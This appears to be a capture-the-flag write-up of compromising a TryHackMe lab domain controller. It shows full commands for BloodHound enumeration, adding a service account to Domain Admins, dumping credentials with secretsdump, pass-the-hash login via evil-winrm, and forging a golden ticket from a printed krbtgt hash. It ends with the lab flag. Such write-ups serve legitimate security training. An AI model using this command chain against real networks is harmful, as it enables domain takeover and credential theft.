# DC.TRYHACKME.LOC

## Machine Information

Domain User from WRK machine: `svc.callback : qvBVAj9avM3ykcbf9s`&#x20;



## Access via SMB with owned user

With discovered user in the WRK machine we can authenticate in the DC with SMB.

```bash
proxychains nxc smb 10.200.150.10 -u "svc.callback" -p 'qvBVAj9avM3ykcbf9s'
```

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>



## Lateral Movement

### Bloodhound Enumeration

Get information through the ingest

{% code overflow="wrap" %}
```bash
proxychains bloodhound-python -c all -ns 10.200.150.10 -dc DC.TRYHACKME.LOC -d TRYHACKME.LOC --zip -u 'svc.callback@TRYHACKME.LOC' -p 'qvBVAj9avM3ykcbf9s'
```
{% endcode %}

Checking the LDAP data in Bloodhound interface, notice that the user `SVC.CALLBACK` has `GenericWrite` privileges to `Domain Admins` group.

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>



### GenericWrite priv to Domain Admins

With this privileges we can add a user to Domain Admins group

{% code overflow="wrap" %}
```bash
proxychains net rpc group addmem "Domain Admins" "SVC.CALLBACK" -U "TRYHACKME.LOC"/"SVC.CALLBACK"%"qvBVAj9avM3ykcbf9s" -S "DC.TRYHACKME.LOC"
```
{% endcode %}

Now check if the user was successfully added to the Domain Admins Group

{% code overflow="wrap" %}
```bash
proxychains net rpc group members "Domain Admins" -U "TRYHACKME.LOC"/"SVC.CALLBACK"%"qvBVAj9avM3ykcbf9s" -S "DC.TRYHACKME.LOC"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>



## Dump credentials with Impacket

With impacket-secretsdump tool dump credentials.

{% code overflow="wrap" %}
```bash
proxychains impacket-secretsdump TRYHACKME.LOC/"SVC.CALLBACK":"qvBVAj9avM3ykcbf9s"@DC.TRYHACKME.LOC
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



## Access to DC as Administrator

Using evil-winrm tool an attacker can get access to a Remote Powershell shell as Administrator using the NTLM dumped.

{% code overflow="wrap" %}
```bash
proxychains evil-winrm -i DC.TRYHACKME.LOC -u 'Administrator' -H '581832e2ee43f9b866f4a3dcaf63a0e0'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>



## Golden Ticket&#x20;

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:399b08294203eeafef6c1ec6d5747127:::
```

FQDN: DC.tryhackme.loc

Domain SID: S-1-5-21-1966530601-3185510712-10604624

Enterprise admin sid: S-1-5-21-1966530601-3185510712-10604624-519

Administrator user sid: S-1-5-21-1966530601-3185510712-10604624-500

### Forge ticket

{% code overflow="wrap" %}
```
proxychains impacket-ticketer -nthash "399b08294203eeafef6c1ec6d5747127" -domain-sid "S-1-5-21-1966530601-3185510712-10604624" -domain "TRYHACKME.LOC" "Administrator" -groups 519 -user-id 500
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>



## Machine Flag

To demostrate that we have compromised this machine, get the machine's flag.

```
more C:\flag.txt

THM{6ab86ae6-631e-4342-85a1-b104ffe45ea7}
```

